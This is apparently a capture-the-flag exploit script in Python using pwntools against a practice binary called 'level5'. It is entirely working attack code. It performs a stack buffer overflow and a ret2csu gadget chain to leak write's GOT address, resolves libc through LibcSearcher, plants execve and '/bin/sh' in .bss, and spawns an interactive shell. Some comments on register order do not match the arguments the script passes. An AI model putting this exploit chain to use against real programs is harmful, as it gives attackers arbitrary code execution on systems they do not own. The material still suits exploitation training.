from pwn import *
from LibcSearcher import LibcSearcher

#context.log_level = 'debug'

level5 = ELF('./level5')
sh = process('./level5')

write_got = level5.got['write']
read_got = level5.got['read']
main_addr = level5.symbols['main']
bss_base = level5.bss()
csu_front_addr = 0x4005F0
csu_end_addr = 0x400606

def csu_payload(rbx, rbp, r12, r13, r14, r15, last):
    # rbx = 0
    # rbp = 1 (rbx+1)
    # r12 = addr.fun
    # rdi = edi = r13d
    # rsi = r14
    # rdx = r15
    # last = main.addr
    payload = b'a' * 0x88
    payload += p64(csu_end_addr) + p64(0) + p64(rbx) + p64(rbp) + p64(r12) + p64(
        r15) + p64(r14) + p64(r13)
    payload += p64(csu_front_addr)
    payload += b'a' * 0x38
    payload += p64(last)
    sh.send(payload)
    sleep(1)

## fun=write(1,write_got,8)
## read 'write_addr' and 'execve_addr' from program
sh.recvuntil(b'Hello, World\n')
csu_payload(0, 1, write_got, 8, write_got, 1, main_addr)

write_addr = u64(sh.recv(8))
libc = LibcSearcher('write', write_addr)
libc_base = write_addr - libc.dump('write')
execve_addr = libc_base + libc.dump('execve')
log.success('execve_addr ' + hex(execve_addr))

## fun=read(0,bss_base,16)
## write 'execve_addr' and '/bin/sh\x00' to bss
sh.recvuntil(b'Hello, World\n')
csu_payload(0, 1, read_got, 16, bss_base, 0, main_addr)
sh.send(p64(execve_addr) + b'/bin/sh\x00')

## fun=execve(bss_base+8)
## execute execve('/bin/sh')
sh.recvuntil(b'Hello, World\n')
csu_payload(0, 1, bss_base, 0, 0, bss_base + 8, main_addr)
sh.interactive()
